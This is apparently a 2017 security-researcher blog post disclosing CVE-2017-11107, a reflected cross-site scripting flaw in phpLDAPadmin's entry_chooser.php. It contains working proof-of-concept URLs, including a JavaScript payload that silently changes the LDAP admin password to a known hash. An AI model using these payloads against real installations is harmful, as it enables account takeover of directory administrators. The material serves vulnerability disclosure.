+++
date = '2017-07-20T11:16:00+00:00'
title = 'Hijacking phpLDAPadmin account using a Cross-site scripting vulnerability (CVE-2017-11107)'
url = 'posts/hijacking-phpldapadmin-xss'
+++

## Software Description

phpLDAPadmin is an web-based LDAP adminstration interface for viewing and manipulating LDAP information.

## Vulnerability Description

`$request['form']` and `$request['rdn']` parameters in file `htdocs/entry_chooser.php` aren't properly sanitized before being displayed to the user, which allows a remote attacker to inject arbitrary HTML/JavaScript code in a user's context.

{{< gist xd4rker 0bcac2062fe59df80b283790ad71b0c7 >}}

This vulnerability, if successfully exploited, can lead to data manipulation or information leakage as it is demonstrated in this PoC video:

{{< youtube Ww7LD_bmH-o >}}

---

## Proof of Concept (PoC)

**XSS via the `form` parameter:**

```https://github.com/leenooks/phpLDAPadmin/issues/50
http://localhost:8888/phpldapadmin/entry_chooser.php?form=advanced_search_form%22).base;%27);}%20alert(1);%20function%20lol()%20{%20isNaN(%27&element=base&rdn=test
```

**XSS via the `rdn` parameter (needs Chrome's XSS Auditor bypass):**

```
http://localhost:8888/phpldapadmin/entry_chooser.php?form=advanced_search_form&element=base&rdn=test%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```

**Changing admin password to `1337`:**

```
%22).base;%27);}%20var%20http=new%20XMLHttpRequest();%20var%20url=%22http://localhost:8888/phpldapadmin/cmd.php%22;%20var%20params=%22cmd%3Dupdate%2526server_id%3D1%2526dn%3Dcn%25253D<LOGIN_DN>%2526new_values%25255Buserpassword%25255D%25255B0%25255D%3D%25257BSSHA%25257Dxtzm0RhdgidTmNnRD0rvUdjCcGhPQgKa%22;%20http.open(%22POST%22,%20url,%20true);%20http.setRequestHeader(%22Content-type%22,%20%22application/x-www-form-urlencoded%22);%20http.send(params);%20function%20lol()%20{%20isNaN(%27
```

**`<LOGIN_DN>`**: Triple URL-encoded login DN (e.g., `cn%253Dadmin%252Cdc%253Dldap%252Cdc%253Dcom`)

**PoC URL:**

```
 http://localhost:8888/phpldapadmin/entry_chooser.php?form=advanced_search_form%22).base;%27);}%20var%20http=new%20XMLHttpRequest();%20var%20url=%22http://localhost:8888/phpldapadmin/cmd.php%22;%20var%20params=%22cmd%3Dupdate%2526server_id%3D1%2526dn%3Dcn%25253Dadmin%25252Cdc%25253Dldap%25252Cdc%25253Dcom%2526new_values%25255Buserpassword%25255D%25255B0%25255D%3D%25257BSSHA%25257Dxtzm0RhdgidTmNnRD0rvUdjCcGhPQgKa%22;%20http.open(%22POST%22,%20url,%20true);%20http.setRequestHeader(%22Content-type%22,%20%22application/x-www-form-urlencoded%22);%20http.send(params);%20function%20lol()%20{%20isNaN(%27&element=base&rdn=test
```

**References:**

- [https://bugs.launchpad.net/ubuntu/+source/phpldapadmin/+bug/1701731](https://bugs.launchpad.net/ubuntu/+source/phpldapadmin/+bug/1701731)
- [https://github.com/leenooks/phpLDAPadmin/issues/50](https://github.com/leenooks/phpLDAPadmin/issues/50)
  https://github.com/leenooks/phpLDAPadmin/issues/50
